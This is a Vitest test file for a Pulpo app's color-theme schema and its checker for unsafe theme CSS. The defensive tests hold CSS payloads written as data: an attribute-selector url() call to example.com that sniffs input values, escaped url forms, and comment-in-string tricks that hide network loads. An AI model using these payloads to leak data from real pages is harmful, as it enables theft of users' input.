import { describe, expect, it } from 'vitest'
import {
  CUSTOM_THEMES_MAX,
  customThemesSchema,
  managementAccountSettingsSchema,
  pulpoThemeExtensionSchema,
  unsafeThemeCssReason,
} from './index.js'

describe('color themes', () => {
  it('keeps the VS Code color ids Pulpo renders, with alpha, and drops the rest', () => {
    const [theme] = customThemesSchema.parse([{
      id: 'custom-1',
      name: ' Iris copy ',
      dark: {
        colors: { 'editor.background': '#1D1929', 'panel.border': '#ffffff17', 'activityBar.background': '#000000' },
        tokenColors: [{ scope: ['keyword', 'storage.type'], settings: { foreground: '#FF7B72' } }],
      },
    }])
    expect(theme).toEqual({
      id: 'custom-1',
      name: 'Iris copy',
      light: { colors: {}, tokenColors: [] },
      dark: {
        colors: { 'editor.background': '#1d1929', 'panel.border': '#ffffff17' },
        tokenColors: [{ scope: ['keyword', 'storage.type'], settings: { foreground: '#ff7b72' } }],
      },
      css: '',
    })
  })

  it('rejects invalid colors, duplicate ids, and too many themes', () => {
    expect(customThemesSchema.safeParse([{ id: 'a', name: 'A', light: { colors: { foreground: 'red' } } }]).success).toBe(false)
    expect(customThemesSchema.safeParse([{ id: 'a', name: 'A' }, { id: 'a', name: 'B' }]).success).toBe(false)
    const many = Array.from({ length: CUSTOM_THEMES_MAX + 1 }, (_, index) => ({ id: `t${index}`, name: 'T' }))
    expect(customThemesSchema.safeParse(many).success).toBe(false)
  })

  it('allows theme CSS that loads nothing from the network', () => {
    expect(unsafeThemeCssReason('.dark [data-slot="button"] { border-radius: 0 !important; }')).toBeNull()
    expect(unsafeThemeCssReason('body { background: url("data:image/png;base64,AAAA") }')).toBeNull()
    expect(unsafeThemeCssReason('svg { fill: url(#gradient) }')).toBeNull()
    expect(unsafeThemeCssReason('.app-main { background-image: linear-gradient(red, blue) }')).toBeNull()
  })

  it('rejects theme CSS that could reach the network, including escaped forms', () => {
    expect(unsafeThemeCssReason('@import "https://example.com/theme.css";')).not.toBeNull()
    expect(unsafeThemeCssReason('input[value^="a"] { background: url(https://example.com/a) }')).not.toBeNull()
    expect(unsafeThemeCssReason('a { background: URL( "//example.com/a" ) }')).not.toBeNull()
    expect(unsafeThemeCssReason('a { background: \\75 rl(https://example.com/a) }')).not.toBeNull()
    expect(unsafeThemeCssReason('a { background: u\\rl(https://example.com/a) }')).not.toBeNull()
    expect(unsafeThemeCssReason('a { background: image-set("https://example.com/a.png" 1x) }')).not.toBeNull()
    expect(unsafeThemeCssReason('@font-face { src: src("https://example.com/f.woff2") }')).not.toBeNull()
    expect(customThemesSchema.safeParse([{ id: 'a', name: 'A', css: '@import "x.css";' }]).success).toBe(false)
    // Comment delimiters inside strings don't comment anything out.
    expect(unsafeThemeCssReason('body { --a: "/*"; background-image: url(https://example.com/collect); --b: "*/"; }')).not.toBeNull()
    expect(unsafeThemeCssReason("body { --a: '/*'; background: url(//example.com/a); --b: '*/' }")).not.toBeNull()
    expect(unsafeThemeCssReason('body { --a: "\\"/*"; background: url(https://example.com/a); --b: "*/" }')).not.toBeNull()
    // Real comments still hide nothing harmful.
    expect(unsafeThemeCssReason('/* url(https://example.com/a) */ body { color: red }')).toBeNull()
  })

  it('reads the Pulpo extension of an exported VS Code theme', () => {
    expect(pulpoThemeExtensionSchema.parse({ version: 1, light: { colors: { foreground: '#000000' } }, css: '' }))
      .toEqual({ version: 1, light: { colors: { foreground: '#000000' }, tokenColors: [] }, css: '' })
    expect(pulpoThemeExtensionSchema.safeParse({ version: 1, css: '@import "x";' }).success).toBe(false)
  })

  it('keeps themes in management account settings', () => {
    const account = managementAccountSettingsSchema.parse({ username: 'pulpo_user' })
    expect(account).toMatchObject({ colorTheme: 'pulpo', customThemes: [] })
    expect(managementAccountSettingsSchema.parse({
      username: 'pulpo_user',
      colorTheme: 'custom-1',
      customThemes: [{ id: 'custom-1', name: 'Mine', dark: { colors: { 'editor.background': '#000000' } } }],
    }).customThemes).toHaveLength(1)
  })
})
